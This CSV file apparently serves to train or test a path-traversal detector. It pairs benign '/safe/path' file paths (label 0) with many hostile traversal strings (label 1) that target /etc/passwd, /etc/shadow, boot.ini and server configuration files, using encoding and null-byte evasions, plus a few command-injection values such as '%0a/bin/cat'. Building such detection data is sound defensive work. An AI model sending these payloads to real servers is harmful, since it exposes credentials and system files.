Sentence,Label
/../../../../../../../../../../etc/shadow,1
/safe/path/file1500.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1004.html,0
/./././././././././././etc/passwd,1
%00/etc/passwd%00,1
/safe/path/file1819.html,0
/safe/path/file1748.html,0
/safe/path/file1877.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
C:\boot.ini,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../../etc/passwd%00.html,1
/./././././././././././boot.ini,1
/safe/path/file1530.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1324.html,0
/safe/path/file1080.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1210.html,0
../../../../../../../../../../../../boot.ini%00,1
%00/etc/shadow%00,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1252.html,0
%00/etc/passwd%00,1
/safe/path/file219.html,0
../../../../../../../../../../../../etc/passwd%00,1
../../../../../../../../../../../../etc/hosts,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file1955.html,0
/safe/path/file1387.html,0
/./././././././././././etc/passwd,1
/safe/path/file1338.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file543.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1398.html,0
/safe/path/file830.html,0
%00../../../../../../etc/passwd,1
/safe/path/file843.html,0
/./././././././././././boot.ini,1
/safe/path/file778.html,0
/safe/path/file1821.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
C:\inetpub\wwwroot\global.asa,1
/safe/path/file585.html,0
/safe/path/file396.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/../../../../../../../../../../etc/shadow,1
/safe/path/file118.html,0
/safe/path/file561.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
%0a/bin/cat%20/etc/passwd,1
%00/etc/passwd%00,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1737.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file1256.html,0
/safe/path/file1791.html,0
/safe/path/file178.html,0
/../../../../../../../../%2A,1
/safe/path/file164.html,0
/safe/path/file1663.html,0
/safe/path/file1172.html,0
/safe/path/file934.html,0
/safe/path/file1505.html,0
/safe/path/file886.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file674.html,0
../../../../../../../../../../../../etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/./././././././././././etc/shadow,1
/safe/path/file312.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file1951.html,0
/safe/path/file1319.html,0
/safe/path/file1111.html,0
/safe/path/file932.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file1760.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file190.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file1367.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file890.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/./././././././././././etc/shadow,1
/safe/path/file286.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
C:/boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file1978.html,0
/safe/path/file57.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/./././././././././././etc/passwd,1
/../../../../../../../../../../etc/passwd^^,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file4.html,0
/../../../../../../../../../../etc/passwd,1
/safe/path/file63.html,0
/safe/path/file127.html,0
/safe/path/file407.html,0
/safe/path/file421.html,0
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1260.html,0
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file625.html,0
/safe/path/file678.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file574.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file726.html,0
/safe/path/file1437.html,0
C:/boot.ini,1
/safe/path/file1432.html,0
/safe/path/file795.html,0
../../../../../../../../../../../../etc/shadow,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1213.html,0
%00/etc/passwd%00,1
%00/etc/shadow%00,1
/safe/path/file212.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file503.html,0
/safe/path/file62.html,0
/safe/path/file13.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file457.html,0
/safe/path/file182.html,0
/safe/path/file646.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1726.html,0
/./././././././././././boot.ini,1
../../../../../../../../conf/server.xml,1
../../../../../../../../../../../../etc/hosts%00,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1386.html,0
/.../.../.../.../.../,1
/safe/path/file245.html,0
/safe/path/file1762.html,0
../../../../../../../../../../../../etc/passwd%00,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1690.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/../../../../../../../../bin/id|,1
/safe/path/file1665.html,0
/safe/path/file1436.html,0
/../../../../../../../../../../etc/shadow^^,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
%00/etc/passwd%00,1
/safe/path/file1579.html,0
%00/etc/shadow%00,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file1030.html,0
/safe/path/file1527.html,0
/safe/path/file1577.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
/safe/path/file1806.html,0
/safe/path/file284.html,0
/safe/path/file419.html,0
/safe/path/file777.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file654.html,0
/../../../../../../../../../../../boot.ini,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
%00/etc/shadow%00,1
../../../../../../../../../../../../etc/passwd,1
../../boot.ini,1
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file165.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
/safe/path/file1801.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
../../../../../../../../../../../../localstart.asp%00,1
/safe/path/file1698.html,0
../../boot.ini,1
/safe/path/file687.html,0
/safe/path/file1911.html,0
C:/boot.ini,1
../../../../../../../../../../../../etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file205.html,0
/safe/path/file1031.html,0
/safe/path/file690.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
/safe/path/file225.html,0
/safe/path/file38.html,0
/safe/path/file1212.html,0
/safe/path/file444.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file925.html,0
%0a/bin/cat%20/etc/shadow,1
/./././././././././././etc/passwd,1
../../../../../../../../../../../../boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file184.html,0
/safe/path/file1908.html,0
../../../../../../../../../../../../localstart.asp,1
/./././././././././././etc/shadow,1
C:/boot.ini,1
/safe/path/file71.html,0
/safe/path/file1308.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file72.html,0
%0a/bin/cat%20/etc/shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file776.html,0
/safe/path/file1075.html,0
../../../../../../../../../../../../localstart.asp,1
../../boot.ini,1
/safe/path/file80.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file1619.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
../../../../../../../../../../../../etc/shadow,1
%0a/bin/cat%20/etc/shadow,1
/safe/path/file982.html,0
/safe/path/file35.html,0
/safe/path/file1366.html,0
/safe/path/file1969.html,0
/safe/path/file1515.html,0
/safe/path/file1890.html,0
/../../../../../../../../../../etc/shadow^^,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file359.html,0
%0a/bin/cat%20/etc/shadow,1
/safe/path/file1425.html,0
/safe/path/file92.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/shadow,1
/safe/path/file500.html,0
/safe/path/file140.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file582.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/../../../../../../../../../../../etc/passwd%00.html,1
../../../../../../../../../../../../etc/shadow%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file613.html,0
/../../../../../../../../%2A,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file875.html,0
/safe/path/file1794.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file862.html,0
/safe/path/file1580.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file978.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/../../../../../../../../%2A,1
/safe/path/file1837.html,0
/safe/path/file1526.html,0
/safe/path/file276.html,0
/safe/path/file1142.html,0
/safe/path/file800.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file1864.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file705.html,0
/safe/path/file228.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/./././././././././././boot.ini,1
%00/etc/shadow%00,1
../../../../../../../../../../../../localstart.asp%00,1
/../../../../../../../../../../etc/shadow^^,1
/safe/path/file1391.html,0
/safe/path/file1499.html,0
%00/etc/shadow%00,1
%0a/bin/cat%20/etc/passwd,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
%00../../../../../../etc/shadow,1
/safe/path/file1808.html,0
/safe/path/file1776.html,0
/safe/path/file1681.html,0
/./././././././././././boot.ini,1
/safe/path/file1852.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1588.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1110.html,0
/safe/path/file96.html,0
%00../../../../../../etc/shadow,1
/../../../../../../../../../../../boot.ini,1
/safe/path/file342.html,0
/safe/path/file332.html,0
/safe/path/file304.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1288.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file867.html,0
/safe/path/file504.html,0
/safe/path/file1891.html,0
/./././././././././././etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/../../../../../../../../../../etc/passwd^^,1
/safe/path/file107.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1790.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file46.html,0
/safe/path/file1047.html,0
/safe/path/file29.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file93.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1932.html,0
/safe/path/file1647.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file192.html,0
/./././././././././././boot.ini,1
../../../../../../../../../../../../etc/passwd%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file291.html,0
/safe/path/file806.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file525.html,0
/safe/path/file1728.html,0
/safe/path/file1016.html,0
/safe/path/file1012.html,0
/safe/path/file1087.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file620.html,0
/safe/path/file31.html,0
/safe/path/file351.html,0
/safe/path/file1413.html,0
/safe/path/file1023.html,0
%0a/bin/cat%20/etc/shadow,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file1991.html,0
/safe/path/file1422.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file234.html,0
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file589.html,0
/safe/path/file1358.html,0
%00/etc/passwd%00,1
/safe/path/file871.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file316.html,0
C:/inetpub/wwwroot/global.asa,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
../../../../../../../../../../../../etc/shadow%00,1
/safe/path/file903.html,0
/safe/path/file648.html,0
/safe/path/file1503.html,0
/..\../..\../..\../..\../..\../..\../etc/shadow,1
/safe/path/file1615.html,0
../../../../../../../../../../../../localstart.asp%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1281.html,0
%0a/bin/cat%20/etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1388.html,0
/safe/path/file200.html,0
/safe/path/file1043.html,0
/safe/path/file1637.html,0
/safe/path/file256.html,0
../../boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file349.html,0
/safe/path/file1295.html,0
/safe/path/file1740.html,0
/safe/path/file1622.html,0
/safe/path/file606.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file329.html,0
/safe/path/file943.html,0
/../../../../../../../../bin/id|,1
/../../../../../../../../../../etc/passwd^^,1
C:/boot.ini,1
/safe/path/file599.html,0
/safe/path/file242.html,0
/../../../../../../../../../../etc/passwd^^,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file1752.html,0
/safe/path/file239.html,0
/safe/path/file821.html,0
/../../../../../../../../../../etc/shadow,1
C:/inetpub/wwwroot/global.asa,1
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1548.html,0
/safe/path/file591.html,0
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file456.html,0
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file782.html,0
/safe/path/file677.html,0
/safe/path/file928.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file1160.html,0
/safe/path/file1945.html,0
/safe/path/file352.html,0
../../../../../../../../../../../../etc/hosts%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file1303.html,0
/safe/path/file919.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../etc/hosts%00,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file1008.html,0
/safe/path/file52.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file95.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
/safe/path/file960.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file1305.html,0
/safe/path/file514.html,0
../../../../../../../../conf/server.xml,1
/safe/path/file583.html,0
/safe/path/file1880.html,0
/../../../../../../../../../../../boot.ini%00.html,1
../../../../../../../../../../../../localstart.asp%00,1
../../../../../../../../../../../../etc/hosts%00,1
/./././././././././././etc/passwd,1
/safe/path/file523.html,0
/safe/path/file1856.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file82.html,0
/safe/path/file576.html,0
/safe/path/file1263.html,0
/safe/path/file1297.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
C:/boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1939.html,0
/safe/path/file1243.html,0
/safe/path/file859.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
%00/etc/shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
/safe/path/file1992.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/./././././././././././boot.ini,1
C:/boot.ini,1
/safe/path/file904.html,0
/safe/path/file436.html,0
C:/boot.ini,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
/safe/path/file896.html,0
/safe/path/file1557.html,0
/safe/path/file132.html,0
/safe/path/file1337.html,0
/safe/path/file1789.html,0
/safe/path/file560.html,0
/safe/path/file166.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/./././././././././././boot.ini,1
/../../../../../../../../../../../etc/passwd%00.html,1
/..\../..\../..\../..\../..\../..\../etc/passwd,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
../../../../../../../../../../../../etc/passwd%00,1
C:\boot.ini,1
/safe/path/file158.html,0
/safe/path/file1020.html,0
C:/boot.ini,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file1373.html,0
/safe/path/file1321.html,0
/../../../../../../../../%2A,1
/./././././././././././etc/passwd,1
../../../../../../../../../../../../etc/passwd,1
/./././././././././././etc/shadow,1
/safe/path/file1966.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
C:/boot.ini,1
/safe/path/file1402.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file157.html,0
/safe/path/file809.html,0
/safe/path/file1105.html,0
C:\inetpub\wwwroot\global.asa,1
/safe/path/file709.html,0
/safe/path/file1042.html,0
/safe/path/file1225.html,0
.\.\.\.\.\.\.\.\.\.\./etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file446.html,0
/./././././././././././etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file1194.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/../../../../../../../../../../../etc/passwd%00.html,1
/.../.../.../.../.../,1
/safe/path/file229.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
%00/etc/shadow%00,1
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file1237.html,0
/safe/path/file1798.html,0
/safe/path/file986.html,0
../../../../../../../../../../../../etc/shadow,1
/safe/path/file961.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
/safe/path/file1056.html,0
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file1376.html,0
/safe/path/file1983.html,0
/../../../../../../../../../../etc/passwd,1
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file820.html,0
/../../../../../../../../../../etc/shadow,1
/safe/path/file273.html,0
/safe/path/file1010.html,0
/safe/path/file728.html,0
/..\../..\../..\../..\../..\../..\../etc/passwd,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file753.html,0
../../../../../../../../../../../../localstart.asp,1
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1494.html,0
%0a/bin/cat%20/etc/passwd,1
/safe/path/file43.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd,1
../../../../../../../../../../../../etc/hosts,1
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file939.html,0
/safe/path/file556.html,0
/safe/path/file318.html,0
/../../../../../../../../%2A,1
/safe/path/file1493.html,0
/safe/path/file1638.html,0
../../boot.ini,1
../../../../../../../../../../../../etc/passwd%00,1
%00../../../../../../etc/shadow,1
C:\boot.ini,1
/safe/path/file1501.html,0
/safe/path/file1539.html,0
/safe/path/file1280.html,0
/./././././././././././boot.ini,1
/safe/path/file751.html,0
/safe/path/file1799.html,0
/safe/path/file651.html,0
/safe/path/file1068.html,0
../../../../../../../../../../../../localstart.asp,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
../../../../../../../../../../../../etc/shadow%00,1
../../../../../../../../../../../../etc/hosts,1
/safe/path/file1447.html,0
/safe/path/file14.html,0
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file115.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
%00/etc/shadow%00,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/safe/path/file719.html,0
/safe/path/file707.html,0
/safe/path/file891.html,0
/safe/path/file109.html,0
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file1682.html,0
/../../../../../../../../../../../boot.ini%00.html,1
/safe/path/file1987.html,0
%00/etc/shadow%00,1
.\.\.\.\.\.\.\.\.\.\./etc/shadow,1
/safe/path/file766.html,0
C:/boot.ini,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
C:/inetpub/wwwroot/global.asa,1
/safe/path/file507.html,0
/../../../../../../../../../../etc/passwd^^,1
../../../../../../../../../../../../boot.ini%00,1
/safe/path/file676.html,0
/safe/path/file1362.html,0
/safe/path/file463.html,0
/safe/path/file710.html,0
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file882.html,0
%0a/bin/cat%20/etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
/safe/path/file372.html,0
/safe/path/file1468.html,0
/safe/path/file162.html,0
/safe/path/file478.html,0
/../../../../../../../../bin/id|,1
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file917.html,0
/safe/path/file278.html,0
/safe/path/file828.html,0
/safe/path/file535.html,0
/../../../../../../../../../../../boot.ini,1
/safe/path/file1300.html,0
../../../../../../../../../../../../etc/passwd%00,1
/safe/path/file688.html,0
..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,1
/safe/path/file230.html,0
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
/safe/path/file1840.html,0
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
/../../../../../../../../../../etc/passwd,1
/safe/path/file1487.html,0
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
/safe/path/file892.html,0
/safe/path/file1018.html,0
/safe/path/file1995.html,0
../../../../../../../../../../../../etc/passwd,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,1
/safe/path/file19.html,0
/safe/path/file85.html,0
\&apos;/bin/cat%20/etc/passwd\&apos;,1
/safe/path/file617.html,0
%00../../../../../../etc/passwd,1
\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
../../../../../../../../../../../../etc/passwd,1
../../../../../../../../../../../../etc/hosts%00,1
/safe/path/file193.html,0
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
../../boot.ini,1
%00/etc/passwd%00,1
/safe/path/file846.html,0
/../../../../../../../../../../../etc/passwd%00.html,1
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
/safe/path/file1958.html,0
/safe/path/file565.html,0
/../../../../../../../../../../../boot.ini%00.jpg,1
/../../../../../../../../../../../boot.ini%00.jpg,1
/safe/path/file383.html,0
C:/boot.ini,1
/safe/path/file1961.html,0
%0a/bin/cat%20/etc/shadow,1
/../../../../../../../../../../../etc/passwd%00.jpg,1
/safe/path/file1956.html,0
%0a/bin/cat%20/etc/shadow,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
